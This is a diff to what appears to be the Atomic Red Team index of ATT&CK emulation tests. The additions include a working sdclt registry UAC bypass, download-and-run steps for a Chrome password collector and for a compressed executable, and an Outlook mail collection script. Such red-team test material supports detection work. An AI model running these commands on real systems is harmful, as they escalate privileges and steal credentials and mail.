@@ -1005,6 +1005,26 @@ persistence:
           2. Navigate to [manifest.json](./src/manifest.json)
 
           3. Then click 'Open'
+    - name: Edge Chromium Addon - VPN
+      description: 'Adversaries may use VPN extensions in an attempt to hide traffic
+        sent from a compromised host. This will install one (of many) available VPNS
+        in the Edge add-on store.
+
+'
+      supported_platforms:
+      - windows
+      - macos
+      executor:
+        name: manual
+        steps: |
+          1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj
+          in Edge Chromium
+
+          2. Click 'Get'
+        cleanup: |-
+          1. Navigate to "..." menu in top right of browser and select.
+          2. In drop down, click on "Extensions".
+          3. Remove the Extension.
   T1042:
     technique:
       x_mitre_data_sources:
@@ -6054,6 +6074,30 @@ defense-evasion:
         cleanup_command: |
           rd "\\?\C:\Windows \" /S /Q >nul 2>nul
           del "c:\testbypass.exe" >nul 2>nul
+    - name: Bypass UAC using sdclt DelegateExecute
+      description: "Bypasses User Account Control using a fileless method, registry
+        only. \nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference
+        - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted
+        from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        command.to.execute:
+          description: Command to execute
+          type: string
+          default: cmd.exe /c notepad.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
+          New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+          Start-Process -FilePath $env:windir\system32\sdclt.exe
+          Start-Sleep -s 3
+        cleanup_command: 'Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
+          -Force -ErrorAction Ignore
+
+'
   T1191:
     technique:
       x_mitre_data_sources:
@@ -11234,6 +11278,39 @@ defense-evasion:
           -Name #{registry_entry_storage}
 
 '
+    - name: Execution from Compressed File
+      description: 'Mimic execution of compressed executable. When successfully executed,
+        calculator.exe will open.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_payload:
+          description: EXE to execute
+          type: Path
+          default: "%temp%\\temp_T1027.zip\\T1027.exe"
+        url_path:
+          description: url to download Exe
+          type: url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
+      dependency_executor_name: powershell
+      elevation_required: true
+      dependencies:
+      - description: T1027.exe must exist on disk at specified location
+        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
+          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\"
+      executor:
+        name: command_prompt
+        command: '"#{exe_payload}"
+
+'
+        cleanup_command: |
+          taskkill /f /im calculator.exe >nul 2>nul
+          rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
+          del /Q "%temp%\T1027.zip" >nul 2>nul
   T1502:
     technique:
       x_mitre_data_sources:
@@ -14585,6 +14662,30 @@ privilege-escalation:
         cleanup_command: |
           rd "\\?\C:\Windows \" /S /Q >nul 2>nul
           del "c:\testbypass.exe" >nul 2>nul
+    - name: Bypass UAC using sdclt DelegateExecute
+      description: "Bypasses User Account Control using a fileless method, registry
+        only. \nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference
+        - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted
+        from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        command.to.execute:
+          description: Command to execute
+          type: string
+          default: cmd.exe /c notepad.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
+          New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+          Start-Process -FilePath $env:windir\system32\sdclt.exe
+          Start-Sleep -s 3
+        cleanup_command: 'Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
+          -Force -ErrorAction Ignore
+
+'
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -17999,15 +18100,26 @@ discovery:
           SilentlyContinue -Force
 
 '
-    - name: List Google Chrome Bookmarks on Windows with command prompt.
+    - name: List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt.
       description: |
-        Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.
+        Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.
         Upon execution, paths that contain bookmark files will be displayed.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'where /R C:\Users\ Bookmarks
+
+'
+    - name: List Mozilla Firefox bookmarks on Windows with command prompt.
+      description: |
+        Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.
+        Upon execution, paths that contain bookmark files will be displayed.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: 'where /R C:\Users\ places.sqlite
 
 '
   '':
@@ -21400,6 +21512,37 @@ credential-access:
         command: 'pypykatz live registry
 
 '
+    - name: Run Chrome-password Collector
+      description: |
+        A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
+
+        Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.
+
+        Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path for modified Sysinternals
+          type: String
+          default: "$env:TEMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Modified Sysinternals must be located at #{file_path}'
+        prereq_command: 'if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit
+          1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+          Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
+          Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Set-Location -path "#{file_path}\Sysinternals";
+          ./accesschk.exe -accepteula .;
+        cleanup_command: 'Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction
+          Ignore'
   T1081:
     technique:
       x_mitre_permissions_required:
@@ -23030,6 +23173,89 @@ execution:
         command: 'start $PathToAtomicsFolder\T1173\bin\DDE_Document.docx
 
 '
+  T1106:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_data_sources:
+      - API monitoring
+      - Process monitoring
+      name: Execution through API
+      description: |-
+        Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. (Citation: Microsoft CreateProcess)
+
+        Additional Windows API calls that can be used to execute binaries include: (Citation: Kanthak Verifier)
+
+        * CreateProcessA() and CreateProcessW(),
+        * CreateProcessAsUserA() and CreateProcessAsUserW(),
+        * CreateProcessInternalA() and CreateProcessInternalW(),
+        * CreateProcessWithLogonW(), CreateProcessWithTokenW(),
+        * LoadLibraryA() and LoadLibraryW(),
+        * LoadLibraryExA() and LoadLibraryExW(),
+        * LoadModule(),
+        * LoadPackagedLibrary(),
+        * WinExec(),
+        * ShellExecuteA() and ShellExecuteW(),
+        * ShellExecuteExA() and ShellExecuteExW()
+      x_mitre_remote_support: false
+      id: attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Monitoring API calls may generate a significant amount of
+        data and may not be directly useful for defense unless collected under specific
+        circumstances, since benign use of Windows API functions such as CreateProcess
+        are common and difficult to distinguish from malicious behavior. Correlation
+        of other events with behavior surrounding API function calls using API monitoring
+        will provide additional context to an event that may assist in determining
+        if it is due to malicious behavior. Correlation of activity by process lineage
+        by process ID may be sufficient.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Stefan Kanthak
+      created: '2017-05-31T21:31:17.472Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: execution
+      external_references:
+      - external_id: T1106
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1106
+      - source_name: Microsoft CreateProcess
+        description: Microsoft. (n.d.). CreateProcess function. Retrieved December
+          5, 2014.
+        url: http://msdn.microsoft.com/en-us/library/ms682425
+      - source_name: Kanthak Verifier
+        description: Kanthak, S. (2017). Application Verifier Provider. Retrieved
+          February 13, 2017.
+        url: https://skanthak.homepage.t-online.de/verifier.html
+      modified: '2019-07-17T20:10:02.128Z'
+      identifier: T1106
+    atomic_tests:
+    - name: Execution through API - CreateProcess
+      description: Execute program by leveraging Win32 API's. By default, this will
+        launch calc.exe from the command prompt.
+      supported_platforms:
+      - windows
+      input_arguments:
+        source_file:
+          description: Location of the CSharp source_file
+          type: Path
+          default: PathToAtomicsFolder\T1106\src\CreateProcess.cs
+        output_file:
+          description: Location of the payload
+          type: Path
+          default: "%tmp%\\T1106.exe"
+      executor:
+        command: |
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}
+          %tmp/T1106.exe
+        name: command_prompt
   T1118:
     technique:
       x_mitre_data_sources:
@@ -26484,7 +26710,7 @@ execution:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
+        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -28008,7 +28234,7 @@ lateral-movement:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
+        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -28584,26 +28810,38 @@ collection:
       modified: '2019-10-08T20:59:13.652Z'
       identifier: T1114
     atomic_tests:
-    - name: T1114 Email Collection with PowerShell
-      description: 'Search through local Outlook installation, extract mail, compress
-        the contents, and saves everything to a directory for later exfiltration.
+    - name: Email Collection with PowerShell Get-Inbox
+      description: |
+        Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
+        Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.
 
-'
+        Note: Outlook is required, but no email account necessary to produce artifacts.
       supported_platforms:
       - windows
       input_arguments:
+        file_path:
+          description: File path for Get-Inbox.ps1
+          type: String
+          default: PathToAtomicsFolder\T1114\src
         output_file:
           description: Output file path
           type: String
-          default: "$home\\desktop\\mail.csv"
+          default: "$env:TEMP\\mail.csv"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Get-Inbox.ps1 must be located at #{file_path}'
+        prereq_command: 'if (Test-Path #{file_path}\Get-Inbox.ps1) {exit 0} else {exit
+          1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/src/Get-Inbox.ps1"
+          -OutFile "#{file_path}\Get-Inbox.ps1"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: 'powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1
+        command: 'powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1
           -file #{output_file}
 
 '
-        cleanup_command: 'del #{output_file} >nul 2>&1
+        cleanup_command: 'Remove-Item #{output_file} -Force -ErrorAction Ignore
 
 '
   T1056:
